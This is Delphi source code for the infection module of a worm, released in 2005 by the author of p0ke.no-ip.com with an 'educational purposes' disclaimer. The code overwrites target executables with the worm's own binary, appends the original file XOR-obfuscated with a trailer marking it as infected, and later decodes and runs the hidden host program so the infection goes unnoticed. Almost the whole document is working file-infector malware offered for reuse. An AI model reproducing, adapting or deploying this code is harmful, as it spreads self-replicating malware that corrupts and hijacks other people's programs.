   {

     Requested sourcecode for p0ke.no-ip.com page.
     use this as you want, but remember its only
     open source code for educational purposes.

     If you do not agree to take responsibility
     for any actions/damage made by this sourcecode
     (after your own modifications/compile) then
     close this project at once.
     The only responsible for anything here is you.

     (c) p0ke.no-ip.com 2005

     This unit contains the infection source for the
     worm. Changing/modifying anything might result
     into errors, so unless you know what you are
     doing, leave it as it is.

     Note:
       This sourcecode is uncommented for more advanced coders.
       A sourcecode with comments will be release at p0ke.no-ip.com

   }

   unit flipinfect;

   interface

   uses
     Windows, ShellApi;

     Procedure ReleaseFiles;
     Procedure InfectFile(Name: String);

   implementation

   function StrtoInt(const S: string): integer; var E: integer;
   begin Val(S, Result, E);end;
   function InttoStr(const Value: integer): string; var S: string[11];
   begin Str(Value, S); Result := S; end;

   function GetRandName: String;
   Var
     Name: String;
   Begin
     Str(GetTickCount, Name);
     Result := Name+'.exe';
   End;

   Procedure EncryptData(Var Data: String);
   Var
     ASCII_Ord     :Integer;
     ASCII_Xor     :Integer;
     Int           :Integer;

     ASCII_Char    :String;
     ASCII_Result  :String;
     ASCII_Temp    :String;
   Begin
     If (Data = '') Then Exit;
     ASCII_Result := '';

     For Int := 1 To (Length(Data)) Do
     Begin
       ASCII_Temp := Data[Int];
       ASCII_Ord  := Ord(ASCII_Temp[1]);
       ASCII_Xor  := ((ASCII_Ord XOR 10) Xor 2);
       ASCII_Char := Chr(ASCII_Xor);
       ASCII_Result := ASCII_Result + ASCII_Char;
     End;

     Data := ASCII_Result;
   End;

   // --- modified function (orginally by HaTcHeT)
   Procedure ReadFileStr(Name: String; Var Output: String);
   Var
     cFile :File Of Char;
     Buf   :Array [1..1024] Of Char;
     Len   :LongInt;
     Size  :LongInt;
   Begin
     Try
       Output := '';

       AssignFile(cFile, Name);
       Reset(cFile);
       Size := FileSize(cFile);
       While Not (Eof(cFile)) Do
       Begin
         BlockRead(cFile, Buf, 1024, Len);
         Output := Output + String(Buf);
       End;
       CloseFile(cFile);

       If Length(Output) > Size Then
         Output := Copy(Output, 1, Size);
     Except
       ;
     End;
   End;

   // --- modified function (orginally by HaTcHeT)
   Procedure InfectFile(Name: String);
   Var
     FileBuffer    :String;
     EncBuffer     :String;
     Settings      :String;
     F             :TextFile;
   Begin
     If (Name = ParamStr(0)) Then Exit;

     FileBuffer := '';
     ReadFileStr(Name, FileBuffer);
     If (FileBuffer = '') Then Exit;

     If Pos('pe\flipside\opensource', FileBuffer) > 0 Then Exit;
     If Not (CopyFile(pChar(ParamStr(0)), pChar(Name), False)) Then Exit;

     Settings := #00 + GetRandName + #02 + IntToStr(Length(FileBuffer)) + #01;

     EncBuffer := FileBuffer;
     EncryptData(EncBuffer);

     AssignFile(F, Name);
     Append(F);
     Write(F, EncBuffer);
     Write(F, Settings);
     CloseFile(F);
   End;

   // --- modified function (orginally by HaTcHeT)
   Procedure ReleaseFiles;
   Var
     Content       :String;
     Settings      :String;
     Name          :String;
     FSet          :String;
     PName         :String;
     EncryptBuf    :String;

     I             :Integer;
     Size          :Integer;

     F             :TextFile;
   Begin
     PName := GetRandName;

     If Not (CopyFile(pChar(ParamStr(0)), pChar(PName), False)) Then Exit;
     ReadFileStr(PName, Content);

     I := Length(Content);
     Settings := '';

     While (I > 0) and (Content[i] <> #00) Do
     Begin
       Settings := Content[i] + Settings;
       Dec(I);
     End;

     If (Settings = '') Then
     Begin
       DeleteFile(pChar(PName));
       Exit;
     End;

     Delete(Content, I, Length(Settings));

     While (Pos(#01, Settings) > 0) Do
     Begin

       FSet := Copy(Settings, 1, Pos(#01, Settings)-1);
       Delete(Settings, 1, Pos(#01, Settings));

       Name := Copy(FSet, 1, Pos(#02, FSet)-1);
       Delete(FSet, 1, Pos(#02, FSet));

       Size := StrToInt(FSet);

       Try
         AssignFile(F, Name);
         ReWrite(F);

         EncryptBuf := Copy(Content, Length(Content)-Size, Size);
         EncryptData(EncryptBuf);

         Write(F, EncryptBuf);
         CloseFile(F);
       Except
         Exit;
       End;

       Delete(Content, Length(Content)-Size, Size);
       ShellExecute(0, NIL, pChar(Name), NIL, NIL, 1);
     End;
     DeleteFile(pChar(PName));
   End;

   end.
